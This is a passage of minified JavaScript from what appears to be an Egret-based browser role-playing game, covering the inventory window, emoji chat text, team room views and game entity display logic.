l=this.eVs.getElementAt(0);if(!l)return;l.openIdx=this.param[1]||0}else if("BookPanel"==r){if(!p.OpenSystem.ins().checkSysOpen(a.SystemType.BOOK))return}else if("HeirloomPanel"==r&&!p.OpenSystem.ins().checkSysOpen(a.SystemType.Heirloom))return;this.eVs.selectedIndex=t},e.prototype.GuideClothes=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideClothes()},e.prototype.GuideWeapon=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideWeapon()},e.prototype.GuideClose=function(){return this.baseWin.eCloseBtn},e.prototype.GuideQx=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideQx()},e.prototype.GuideQxBtn=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideQxBtn()},e.prototype.GuideSf=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideSf()},e.prototype.GuideCallBack=function(){var t=this.eVs.getElementAt(0);if(t)return t.GuideCallBack()},e.prototype.CHANGING=function(t,e){void 0===e&&(e=null);var i,n=e?e:this,o=n.eVs.selectedIndex,s=n.eTab.selectedIndex,a=d.EquipCT.ins().keepSacrifice;a&&a.attArr.length>0&&0==o&&(i=gettext("装备祭炼")),i&&(t.preventDefault(),v.WarnWin.show(gettext("当前{0}属性未保存，是否确认放弃?",i),function(){var t=egret.getQualifiedClassName(n.eVs.getChildAt(s));win.openCheck(egret.getDefinitionByName(t))&&(d.EquipCT.ins().postChangeTabClear(),n.eVs.selectedIndex=s,d.EquipCT.ins().changetabEquip())},n))},e.prototype.closeFun=function(t){var e,i=t,n=i.eVs.selectedIndex,o=i.eTab.selectedIndex,s=d.EquipCT.ins().keepSacrifice;return s&&s.attArr.length>0&&0==n&&(e=gettext("装备祭炼")),e?void v.WarnWin.show(gettext("当前{0}属性未保存，是否确认放弃?",e),function(){var t=egret.getQualifiedClassName(i.eVs.getChildAt(o));win.openCheck(egret.getDefinitionByName(t))&&(d.EquipCT.ins().postChangeTabClear(),i.eVs.selectedIndex=o,d.EquipCT.ins().changetabEquip(),win.close("BagWin"))},i):void win.close("BagWin")},__decorate([delayCall(100)],e.prototype,"redRefresh",null),e}(o.BaseView);e.BagWin=b,window.BagWin=b,__reflect(b.prototype,"BagWin",[]),window.BagWin=b},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EmojiAlign=e.Emoji=e.EmojiText=void 0;var n=i(5),o=i(157),s=i(16),a=i(0),r=i(1),l=i(21),h=function(t){function e(e){var i=t.call(this)||this;return i.emojiSize=1,i.curHight=0,i._autoWrapLine=!0,i._emojiAlignment=p.CENTER,i.SPACEING_E=.275,i.EMOJI_INTERVAL=3,i.EMOJI_SPACEING=" ",i.emojiArr={},i.msgTxt=new eui.Label,i.msgTxt.x=0,i.msgTxt.y=0,i.msgTxt.lineSpacing=20,i.msgTxt.verticalAlign="top",getLangType()==LanguageEnum.AR&&(i.msgTxt.textAlign="right"),i.msgTxt.size=20,i.addChild(i.msgTxt),e&&i.addEventListener(egret.Event.ADDED_TO_STAGE,i.onAddToStage,i),i}return __extends(e,t),e.prototype.onAddToStage=function(t){this.removeEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.onRemoveFromStage,this)},e.prototype.onRemoveFromStage=function(){this.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.onAddToStage,this),this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.reset()},Object.defineProperty(e.prototype,"richText",{set:function(t){if(this.reset(),t){var e=this.splitFace(t);if(!e.emojis)return void(-1!=e.msgs[0].indexOf("<a")&&-1!=e.msgs[0].indexOf("</a>")?this.msgTxt.textFlow=(new egret.HtmlTextParser).parse(e.msgs[0]):this.msgTxt.textFlow=n.TextFlowMaker.generateTextFlow1(e.msgs[0]));for(var i=e.msgs.length,o="",s=0;i>s;s++)-1!=e.msgs[s].indexOf("<a")&&-1!=e.msgs[s].indexOf("</a>")?o+=e.msgs[s]:this.appendText(e.msgs[s]),e.emojis[s]&&this.insertEmoji(e.emojis[s]);if(-1!=o.indexOf("<a")&&-1!=o.indexOf("</a>")){var a=n.TextFlowMaker.generateTextFlow(o),r={text:"        ",style:null};getLangType()==LanguageEnum.AR?(a.push(r),a.reverse()):a.unshift(r),this.msgTxt.textFlow=a}if(getLangType()==LanguageEnum.AR){var l=n.TextFlowMaker.reverseAlbTextValue(this.msgTxt,this.msgTxt.textFlow);this.msgTxt.textFlow=l}}},enumerable:!1,configurable:!0}),e.prototype.insertEmoji=function(t){var i=t.replace(o.RegExpUtil.CHAT_EMOJI_ID,""),n=this.getEmojiInfo(+i);if(!n)return void this.appendText(t);var s=n.soure?n.soure:"emoji_"+i+"_png";e.VIP_IMG==t&&(n.width=45),e.SVIP_IMG==t&&(n.width=60),this.setEmojiSize(n.scale>0?n.scale:1),this.emojiW=n.width*this.emojiSize,this.emojiH=n.height*this.emojiSize;var a=this.addEmoji(s);this.emojiArr[a.hashCode]=a},e.prototype.addEmoji=function(t){var e=ObjectPool.pop("Emoji");e.setData(t),e.scaleX=e.scaleY=this.emojiSize,this.addChildAt(e,0);var i=this.msgTxt.$getLinesArr()||this.msgTxt.$getLinesArr2(),n=this.msgTxt.numLines||(i?i.length:0),o=n>0&&i&&i[n-1]?i[n-1].width||0:0;this._autoWrapLine?(o+this.emojiW>this.msgTxt.width?(this.appendText("\n"),getLangType()==LanguageEnum.AR?e.x=this.msgTxt.width-this.EMOJI_INTERVAL-this.emojiW:e.x=0):getLangType()==LanguageEnum.AR?e.x=this.msgTxt.width-o-this.EMOJI_INTERVAL-this.emojiW:e.x=o+this.EMOJI_INTERVAL,e.y=this.getEmojiY()):(getLangType()==LanguageEnum.AR?e.x=this.msgTxt.width-o-this.EMOJI_INTERVAL-this.emojiW:e.x=o+this.EMOJI_INTERVAL,e.y=this.getEmojiY()),this.curHight=this.curHight>e.y+this.emojiH?this.curHight:e.y+this.emojiH;for(var s="",a=0,r=this.SPACEING_E*this.msgTxt.size;this.emojiW>r*a;)s+=this.EMOJI_SPACEING,a++;return this.appendText(s),e},Object.defineProperty(e.prototype,"autoWrapLine",{set:function(t){this._autoWrapLine=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"emojiAlignment",{set:function(t){this._emojiAlignment=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"textColor",{set:function(t){this.msgTxt.textColor=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"size",{set:function(t){this.msgTxt.size=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"textWidth",{set:function(t){this.width=t,this.msgTxt.width=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"textheight",{set:function(t){this.height=t,this.msgTxt.height=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"lineSpacing",{set:function(t){this.msgTxt.lineSpacing=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"uHeight",{get:function(){return this.curHight>this.msgTxt.textHeight?this.curHight:this.msgTxt.textHeight},enumerable:!1,configurable:!0}),e.prototype.setEmojiSize=function(t){this.emojiSize=t},e.prototype.reset=function(){this.curHight=20,this.msgTxt.text="",this.removeAllEmoji()},e.prototype.removeAllEmoji=function(){for(var t in this.emojiArr){var e=this.emojiArr[t];s.DisplayUtils.removeFromParent(e),ObjectPool.push(e)}this.emojiArr={}},e.prototype.getEmojiInfo=function(t){return a.GlobalConfig.ChatEmojiConfig[t]?a.GlobalConfig.ChatEmojiConfig[t]:null},e.prototype.appendText=function(t){var e=n.TextFlowMaker.generateTextFlow1(t);getLangType()==LanguageEnum.AR&&isArabic(t)&&e.reverse(),this.msgTxt.textFlow=this.msgTxt.textFlow.concat(e)},e.prototype.getEmojiY=function(){for(var t=0,e=this.msgTxt.$getLinesArr()||this.msgTxt.$getLinesArr2(),i=this.msgTxt.numLines||(e?e.length:0),n=0;i>n;n++)n>0&&(t+=e[n].height+this.msgTxt.lineSpacing);switch(this._emojiAlignment){case p.UP:return t;case p.CENTER:return t-(this.emojiH-this.msgTxt.size>>1)*this.emojiSize;case p.DOWN:return t-(this.emojiH-this.msgTxt.size)*this.emojiSize;default:return t-(this.emojiH-this.msgTxt.size>>1)*this.emojiSize}},e.prototype.splitFace=function(t){return{emojis:t.match(o.RegExpUtil.CHAT_EMOJI),msgs:t.split(o.RegExpUtil.CHAT_EMOJI)}},e.EMOJI_MAX_ID=36,e.MAX_ID=100,e.VIP_IMG="$80$",e.SVIP_IMG="$81$",e.SYS_IMG="$82$",e.ALL_IMG="$83$",e.GUILD_IMG="$84$",e.KF_IMG="$85$",e.ZY_IMG="$86$",e.GG_IMG="$87$",e}(egret.Sprite);e.EmojiText=h,window.EmojiText=h,__reflect(h.prototype,"EmojiText",[]);var u=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.setData=function(t,e){void 0===e&&(e=!1),e?(this.emojiMc||(this.emojiMc=new l.MovieClip),this.emojiMc.playFile(RES_DIR_EFF+t,-1),this.addChild(this.emojiMc)):(this.emojiImg||(this.emojiImg=new eui.Image,this.addChild(this.emojiImg)),this.emojiImg.source=t)},e.prototype.reset=function(){this.emojiImg?this.emojiImg.source="":this.emojiMc&&this.emojiMc.stop()},e.prototype.dispose=function(){this.reset(),this.emojiMc&&s.DisplayUtils.removeFromParent(this.emojiMc)},e}(r.BaseView);e.Emoji=u,window.Emoji=u,__reflect(u.prototype,"Emoji",[]),window.Emoji=u;var p;!function(t){t[t.UP=1]="UP",t[t.CENTER=2]="CENTER",t[t.DOWN=3]="DOWN"}(p=e.EmojiAlign||(e.EmojiAlign={})),window.EmojiAlign=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CollectWin=void 0;var n=i(1),o=i(21),s=i(4),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="CollectSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.progressBar.labelFunction=function(t,e){return""},this.progressBar.value=0,this.progressBar.visible=!0,this.bgmc=new o.MovieClip,this.bgmc.playFile(RES_DIR_EFF+"ProgressEff1",-1),this.bgmc.scaleX=1.25,this.effGroup.height=50,this.effGroup.scrollEnabled=!0,this.effGroup.addChild(this.bgmc)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.state.text=gettext("{0} 正在采集中...",s.ActorCC.myName),egret.Tween.removeTweens(this.effGroup),this.effGroup.scaleX=0,this.progressBar.value=0;1e3*t[1];this.progressBar.maximum=t[1],egret.Tween.get(this.effGroup).to({scaleX:1},1e3*t[1]),egret.Tween.get(this.progressBar).to({value:t[1]},1e3*t[1])},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];egret.Tween.removeTweens(this.effGroup),egret.Tween.removeTweens(this.progressBar)},e}(n.BaseView);e.CollectWin=a,window.CollectWin=a,__reflect(a.prototype,"CollectWin",[]),window.CollectWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneRedPointMgr=void 0;var n=i(50),o=i(4),s=i(13),a=i(10),r=i(127),l=i(108),h=i(150),u=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.checkSingleUpgrade=function(t){if(!r.RuneCC.checkOpen())return!1;var e=l.RuneConfigMgr.ins().getBaseCfg(t,!0);if(!e)return!1;var i=l.RuneConfigMgr.ins().getBaseCfg(t),n=o.ActorCC.runeShatter;return n>=e.gain-i.gain},e.prototype.checkRoleUpgrade=function(t){if(!r.RuneCC.checkOpen())return!1;var e=h.RuneDataMgr.ins().getRoleRune(t);if(e)for(var i=0,n=e;i<n.length;i++){var o=n[i];if(o&&o.itemConfig&&o.itemConfig.id>0&&this.checkSingleUpgrade(o))return!0}return!1},e.prototype.checkAllUpgrade=function(){if(!r.RuneCC.checkOpen())return!1;for(var t=s.SubRoles.ins().subRolesLen,e=0;t>e;e++)if(this.checkRoleUpgrade(e))return!0;return!1},e.prototype.checkSingleReplace=function(t,e){return!1},e.prototype.checkSingleInlay=function(t,e){if(!r.RuneCC.checkOpen())return!1;var i=h.RuneDataMgr.ins().getRuneStateByPos(e);if(i){var n=h.RuneDataMgr.ins().getRune(t,e);if(n&&n.configID<=0)for(var o=r.RuneCC.getBagRune(),s=h.RuneDataMgr.ins().getRoleRune(t),l=0,u=o;l<u.length;l++){var p=u[l];if(p){var d=a.ItemUtil.getSubType(p.itemConfig);if(d>0&&s){for(var c=!0,f=0,g=s;f<g.length;f++){var m=g[f];if(m&&m.itemConfig&&m.itemConfig.id>0&&d==a.ItemUtil.getSubType(m.itemConfig)){c=!1;break}}if(c)return!0}}}}return!1},e.prototype.checkRoleInlay=function(t){if(!r.RuneCC.checkOpen())return!1;for(var e=0;e<l.RuneConfigMgr.ins().getOtherCfg().maxEquip;e++)if(this.checkSingleInlay(t,e))return!0;return!1},e.prototype.checkAllInlay=function(){if(!r.RuneCC.checkOpen())return!1;for(var t=s.SubRoles.ins().subRolesLen,e=0;t>e;e++)if(this.checkRoleInlay(e))return!0;return!1},e.prototype.checkRoleAllSituation=function(t){if(!r.RuneCC.checkOpen())return!1;var e=this.checkRoleInlay(t);return e||(e=this.checkRoleUpgrade(t)),e},e.prototype.checkAllSituation=function(t){if(void 0===t&&(t=!0),!r.RuneCC.checkOpen())return!1;var e=this.checkAllInlay();return e||(e=this.checkAllUpgrade()),t&&(e||(e=this.checkCanExchange())),e},e.prototype.checkCanExchange=function(){for(var t=l.RuneConfigMgr.ins().getExchangeDataList(),e=0;e<t.length;e++){var i=t[e];if(o.ActorCC.runeExchange>=i.conversion)return!0}return!1},e}(n.BaseClass);e.RuneRedPointMgr=u,window.RuneRedPointMgr=u,__reflect(u.prototype,"RuneRedPointMgr",[]),window.RuneRedPointMgr=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagCallBackConfirmData=void 0;var n=function(){function t(t,e,i,n,o,s,a){void 0===s&&(s=gettext("是否继续回收？")),void 0===a&&(a=gettext("回收确认")),this.items=[],this.showItems=[],this.target=t,this.cbFun=e,this.items=i,this.showItems=n,this.group=o,this.tips=s,this.title=a}return t}();e.BagCallBackConfirmData=n,window.BagCallBackConfirmData=n,__reflect(n.prototype,"BagCallBackConfirmData",[]),window.BagCallBackConfirmData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertRoomView=void 0;var n=i(45),o=i(75),s=i(148),a=i(1),r=i(696),l=i(0),h=i(138),u=i(4),p=i(58),d=i(2),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="kuafuFbRoomSkin",e.defaultRect=!1,e._memberArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this._memberArr=[this.leader,this.member1,this.member2]},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.update,o.BurningDesertCT.ins().roomMemberInfoBack),observe(this,this.UpdateListMsg,n.ChatCT.ins().postNewChatMsg),observe(this,this.updateChatList,n.ChatCT.ins().postSysChatMsg),observe(this,this.UpdateListMsg,n.ChatCT.ins().postDelMsg),this.observe(o.BurningDesertCT.ins().postOpenInviteView,this.toOpenInvieView),this.chatList.itemRenderer=h.ChatListItemRenderer3,this._charInfoArr=new eui.ArrayCollection,this.chatList.dataProvider=this._charInfoArr,this.addTouchEvent(this,this.onTouch),this.update(),this.updateChatList()},e.prototype.removeDisplay=function(){Timer.stop(this.refushBarList,this)},e.prototype.toOpenInvieView=function(){var t=l.GlobalConfig.HotDesertFbConfig[o.HotDesertFbEnum.ShiKongZhiJing],e=[u.ActorCC.myName],i=p.LangUtils.formatStr(t.inviteText,e);win.open(r.BurningDesertInviteWin,i,o.BurningDesertCT.ins().roomId)},e.prototype.getDifficultyDesc=function(t){var e=gettext("简单");switch(t){case 1:e=gettext("简单");break;case 2:e=gettext("普通");break;case 3:e=gettext("困难")}return e},e.prototype.updateChatList=function(){this._charInfoArr.replaceAll(n.ChatCT.ins().chatListTip2.concat()),this.scr.height=this.chatGroup.height,this.refushBar()},e.prototype.refushBar=function(){Timer.start(100,1,this.refushBarList,this)},e.prototype.refushBarList=function(){0!=this.scr.viewport.contentHeight&&(this.scr.viewport.validateNow(),this.scr.viewport.contentHeight>this.scr.height&&(this.scr.viewport.scrollV=this.scr.viewport.contentHeight-this.scr.height))},e.prototype.update=function(){if(this._roomInfo=o.BurningDesertCT.ins().roomInfo,this._roomInfo){var t=[null,null,null];if(this._roomInfo.members&&this._roomInfo.members.length>0)for(var e=0,i=0,n=this._roomInfo.members.length;n>i;i++)1==this._roomInfo.members[i].leaderStatus?t[0]=this._roomInfo.members[i]:(e++,t[e]=this._roomInfo.members[i]);for(var i=0,n=this._memberArr.length;n>i;i++)this._memberArr[i].data=t[i];this.leader.visible=!0,this.scr.height=this.eGroup.height,this.refushBarList();var s=o.BurningDesertCT.ins().checkMeIsLeader();if(s)this.btnExit.label=gettext("解散队伍"),this.btnEnter.horizontalCenter=120,this.btnExit.horizontalCenter=-120,this.btnEnter.visible=!0;else{this.btnExit.label=gettext("退出队伍");var a=o.BurningDesertCT.ins().burningFbIsGoing();a?(this.btnEnter.visible=!0,this.btnEnter.horizontalCenter=120,this.btnExit.horizontalCenter=-120):(this.btnEnter.visible=!1,this.btnExit.horizontalCenter=0)}}},e.prototype.UpdateListMsg=function(){this.scr.height=this.eGroup.height,this.refushBarList()},e.prototype.onTouch=function(t){switch(t.target){case this.btnEnter:o.BurningDesertCT.ins().checkMeIsLeader()?(win.close(this),o.BurningDesertCT.ins().reqEnterBurnDesert(o.BurningDesertCT.ins().selBossLv)):o.BurningDesertCT.ins().burningFbIsGoing()?(o.BurningDesertCT.ins().reqEnterBurnDesert(0),win.close(this)):d.TipsCT.ins().showTips(gettext("只有队长才能操作"));break;case this.btnExit:o.BurningDesertCT.ins().reqExitRoom(),win.close(this);break;case this.eChat:win.open(s.ChatWin);break;case this.eCloss:win.close(this)}},e}(a.BaseView);e.BurningDesertRoomView=c,window.BurningDesertRoomView=c,__reflect(c.prototype,"BurningDesertRoomView",[]),window.BurningDesertRoomView=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainRoomView=void 0;var n=i(45),o=i(148),s=i(1),a=i(0),r=i(138),l=i(4),h=i(58),u=i(2),p=i(83),d=i(698),c=i(75),f=i(192),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="StardomainRoomSkin",e.defaultRect=!1,e._memberArr=[],e.openType=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this._memberArr=[this.leader,this.member1,this.member2]},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.openType=t?t[0]||0:0,observe(this,this.update,p.StardomainCT.ins().roomMemberInfoBack),observe(this,this.updateChatList,n.ChatCT.ins().postNewChatMsg),observe(this,this.updateChatList,n.ChatCT.ins().postSysChatMsg),observe(this,this.updateChatList,n.ChatCT.ins().postDelMsg),this.observe(p.StardomainCT.ins().postOpenInviteView,this.toOpenInvieView),p.StardomainCT.ins().reqLookTeamInfo(),this.chatList.itemRenderer=r.ChatListItemRenderer3,this._charInfoArr=new eui.ArrayCollection,this.chatList.dataProvider=this._charInfoArr,this.addTouchEvent(this,this.onTouch),this.update(),this.updateChatList()},e.prototype.removeDisplay=function(){this.openType=0,Timer.stop(this.refushBarList,this)},e.prototype.toOpenInvieView=function(){var t=a.GlobalConfig.HotDesertFbConfig[c.HotDesertFbEnum.StarDomain],e=[l.ActorCC.myName],i=h.LangUtils.formatStr(t.inviteText,e);win.open(d.StardomainInviteWin,i,p.StardomainCT.ins().roomId)},e.prototype.updateChatList=function(){this._charInfoArr.replaceAll(n.ChatCT.ins().chatListTip2.concat()),this.scr.height=this.chatGroup.height,this.refushBar()},e.prototype.refushBar=function(){Timer.start(100,1,this.refushBarList,this)},e.prototype.refushBarList=function(){0!=this.scr.viewport.contentHeight&&(this.scr.viewport.validateNow(),this.scr.viewport.contentHeight>this.scr.height&&(this.scr.viewport.scrollV=this.scr.viewport.contentHeight-this.scr.height))},e.prototype.update=function(){if(this._roomInfo=p.StardomainCT.ins().roomInfo,this._roomInfo){var t=[null,null,null];if(this._roomInfo.members&&this._roomInfo.members.length>0)for(var e=0,i=0,n=this._roomInfo.members.length;n>i;i++)1==this._roomInfo.members[i].leaderStatus?t[0]=this._roomInfo.members[i]:(e++,t[e]=this._roomInfo.members[i]);for(var i=0,n=this._memberArr.length;n>i;i++)this._memberArr[i].data=t[i];this.leader.visible=!0,this.scr.height=this.eGroup.height,this.refushBarList();var o=p.StardomainCT.ins().checkMeIsLeader();if(o)this.btnExit.label=gettext("解散队伍"),this.btnEnter.label=1==this.openType?gettext("选择星域"):gettext("进入挑战"),this.btnEnter.horizontalCenter=120,this.btnExit.horizontalCenter=-120,this.btnEnter.visible=!0;else{this.btnExit.label=gettext("退出队伍");var s=p.StardomainCT.ins().stardomainFbIsGoing();s?(this.btnEnter.visible=!0,this.btnEnter.horizontalCenter=120,this.btnExit.horizontalCenter=-120):(this.btnEnter.visible=!1,this.btnExit.horizontalCenter=0)}}},e.prototype.onTouch=function(t){switch(t.target){case this.btnEnter:p.StardomainCT.ins().checkMeIsLeader()?1==this.openType?(win.close(this),win.open(f.StardomainWin)):(win.close(this),p.StardomainCT.ins().reqEnterStardomain(p.StardomainCT.ins().curSelId)):p.StardomainCT.ins().stardomainFbIsGoing()?(p.StardomainCT.ins().reqEnterStardomain(0),win.close(this)):u.TipsCT.ins().showTips(gettext("只有队长才能操作"));break;case this.btnExit:p.StardomainCT.ins().reqExitRoom(),win.close(this);break;case this.eChat:win.open(o.ChatWin);break;case this.eCloss:win.close(this)}},e}(s.BaseView);e.StardomainRoomView=g,window.StardomainRoomView=g,__reflect(g.prototype,"StardomainRoomView",[]),window.StardomainRoomView=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainWin=void 0;var n=i(1),o=i(0),s=i(12),a=i(2),r=i(336),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="StardomainSkin",e.btnArr=[],e.btnGrpArr=[],e.bolInitGrp=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.btnArr=[];for(var t=1;this["btnBoss_"+t];)this.btnArr[t]=this["btnBoss_"+t],this.btnGrpArr[t]=this["btnGrp"+t],t++;this.bolInitGrp=!1,this.setBtnShow(!1)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),this.setBtnShow(!0,!this.bolInitGrp)},e.prototype.setBtnShow=function(t,e){void 0===e&&(e=!1);for(var i=1;i<this.btnGrpArr.length;i++)e?(this.btnGrpArr[i].alpha=0,this.btnGrpArr[i].visible=t,egret.Tween.get(this.btnGrpArr[i]).wait(200*i).to({alpha:1},500)):this.btnGrpArr[i].visible=t},e.prototype.onTap=function(t){switch(t.target){case this.eCloseBtn:win.close(this)}var e=this.btnArr.indexOf(t.target);-1!=e&&win.open(r.StardomainBossWin,e)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=o.GlobalConfig.StarDomainBaseConfig.openId,n=s.OpenSystem.ins().checkSysOpen(i);return n||a.TipsCT.ins().showTips(s.OpenSystem.ins().getNoOpenTips(i)),n},e.prototype.removeDisplay=function(){if(this.skin)for(var t=1;t<this.btnGrpArr.length;t++)egret.Tween.removeTweens(this.btnGrpArr[t])},e}(n.BaseView);e.StardomainWin=l,window.StardomainWin=l,__reflect(l.prototype,"StardomainWin",[]),window.StardomainWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Entity=void 0;var n=i(21),o=i(339),s=i(122),a=i(194),r=i(699),l=i(0),h=i(16),u=i(1),p=i(100),d=i(4),c=i(340),f=i(69),g=i(95),m=i(13),v=i(53),y=i(128),C=i(10),T=i(105),b=i(2),w=i(28),I=i(43),_=i(49),S=i(142),x=i(37),D=i(86),A=i(20),k=i(47),B=i(23),P=i(78),R=function(t){function e(){var e=t.call(this)||this;return e._sn_="entityskin",e.effTopGroup=new eui.Group,e.bodyMc=new n.MovieClip,e.dieMc=new n.MovieClip,e._dir=5,e.buffIDs=[],e.effs={},e.effImg={},e.skinInit=!1,e.waitInit=[],e.effCount=0,e.fashiEffValue=[44501,44502,44503],e.fashiEffArrs=[1160,1170,1180,1190,1230,1240],urlParam.debugTS&&(e.lb_pos=new eui.Label,e.addChild(e.lb_pos),e.lb_pos.horizontalCenter=0,e.lb_pos.textColor=16711680,e.lb_pos.touchEnabled=!1),e}__extends(e,t),i=e,e.create=function(t){var e=new o.EntityData(t),n=this.pool.pop()||new i;return n.init(e),n},e.clearPool=function(){this.pool=[]},Object.defineProperty(e.prototype,"x",{get:function(){return egret.superGetter(i,this,"x")},set:function(t){egret.superSetter(i,this,"x",t),this.lb_pos&&(this.lb_pos.text=(t/p.mainfightcc.gridW>>0)+","+(this.y/p.mainfightcc.gridH>>0))},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"y",{get:function(){return egret.superGetter(i,this,"y")},set:function(t){egret.superSetter(i,this,"y",t),this.lb_pos&&(this.lb_pos.text=(this.x/p.mainfightcc.gridW>>0)+","+(t/p.mainfightcc.gridH>>0))},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"infoModel",{get:function(){return this.data},enumerable:!1,configurable:!0}),e.prototype.skinComplete=function(){this.effTopGroup.name="effTopGroup",this.effTopGroup.x=.5*this.width,this.effTopGroup.y=.5*this.height,this.addChild(this.effTopGroup),isNaN(this._anchorOffsetX)?this._anchorOffsetX=this.grp.anchorOffsetX:this.grp.anchorOffsetX=this._anchorOffsetX,isNaN(this._anchorOffsetY)?this._anchorOffsetY=this.grp.anchorOffsetY:this.grp.anchorOffsetY=this._anchorOffsetY,this.skinInit=!0,this.waitInit.length>0&&console.warn("@@如果皮肤初始化前已经setBuff2了,那就重新播放一次动画");
for(var t=0,e=this.waitInit;t<e.length;t++){var i=e[t];this.dealBuff.apply(this,i)}this.waitInit.length=0},Object.defineProperty(e.prototype,"anchorOffsetX",{get:function(){return this._anchorOffsetX},set:function(t){this._anchorOffsetX=t,this.grp&&(this.grp.anchorOffsetX=t)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"anchorOffsetY",{get:function(){return this._anchorOffsetY},set:function(t){this._anchorOffsetY=t,this.grp&&(this.grp.anchorOffsetY=t)},enumerable:!1,configurable:!0}),e.prototype.addDisplay=function(){if(this.data){this.alpha=1;var t;t=l.GlobalConfig.MonstersConfig[this.data.configID];var e=(null===t||void 0===t?void 0:t.size)?t.size:1;this.scaleX=this.scaleY=e,this.group.visible=!0;var i=this.data.isMy;i?(observe(this,this.updateLv,d.ActorCC.postLevelChange),observe(this,this.updateTitle,y.Title.ins().postUpdateOutward),observe(this,this.updateBg,y.Title.ins().postUpdateOutward),observe(this,this.updateWingEff,d.ActorCC.postUpdateWing),observe(this,this.updateDemonCirEff,d.ActorCC.postUpdateDemonCir),observe(this,this.updateLongGasCirEff,d.ActorCC.postUpdateLongGas),observe(this,this.updateGodCrownCirEff,d.ActorCC.postUpdateGodCrown)):this.data.type==EntityType.Role&&(observe(this,this.updateWingEff,d.ActorCC.postUpdateOtherWing),observe(this,this.updateDemonCirEff,d.ActorCC.postUpdateDemonCir),observe(this,this.updateLongGasCirEff,d.ActorCC.postUpdateLongGas),observe(this,this.updateGodCrownCirEff,d.ActorCC.postUpdateGodCrown)),observe(this,this.updateTarShow,v.ControlCC.setCurTar),observe(this,this.updateHpColor,I.CityCC.ins().doPostTeamPlayerInfo,I.CityCC.ins().postEntityTeamId),observe(this,this.createEnemyEff,S.OtherCT.ins().patchChangeCamp),observe(this,this.createEnemyEff,I.CityCC.ins().postEntityTeamId),observe(this,this.createEnemyEff,I.CityCC.ins().doPostTeamPlayerInfo),observe(this,this.updataCampInfo,k.KfArenaSys.ins().postFbInfo,S.OtherCT.ins().syncCamp),this.eTitleGrp.visible=!1,this.createModel(),this.createTeamRoleEff(),this.createBossEff(),this.createEnemyEff(),this.playAction(s.EntityAction.STAND),this.updateName(),this.updateBg(),this.updateTitle(),this.updateBlood(),this.updateNeiGong(),this.updateLv(),this.updateFace(),this.updatePetImg(),this.updateFire(),this.updateHpColor(),this.updateWingEff(),this.updateDemonCirEff(),this.updateLongGasCirEff(),this.updateGodCrownCirEff(),this.eMPGrp.visible=i,this.stateGrp.removeChildren(),this.effGrp.touchEnabled=!1,this.teamGrp.touchEnabled=!1,this.selectImg.touchEnabled=!1,this.x=this.data.x,this.y=this.data.y,this.eHPGrp.y=this.data.type==EntityType.Pet?110:100;var n=(null===t||void 0===t?void 0:t.type)==g.MonsterType.MonsterType_Fire;n||this.addTouchEvent(this,this.onClick),this.updateTarShow()}},e.prototype.removeDisplay=function(){this.waitInit.length=0,this.effCount=0,a["default"].stop(this),this.removeAllEff(),this.stateGrp&&this.stateGrp.removeChildren(),this.effTopGroup&&this.effTopGroup.removeChildren(),this.action=null,this.data=null,egret.Tween.removeTweens(this),this.alpha=0,this.bossEff&&removeFromParent(this.bossEff),this.bodyMc&&(this.bodyMc.stop(),h.DisplayUtils.removeFromParent(this.bodyMc)),this.teamMc&&(this.teamMc.stop(),h.DisplayUtils.removeFromParent(this.teamMc)),i.pool.push(this)},e.prototype.updateHpColor=function(){var t;this.eHp.source=(null===(t=this.data)||void 0===t?void 0:t.isFriend())?"entity_boolGreen":"entity_boolRed"},e.prototype.onClick=function(t){var 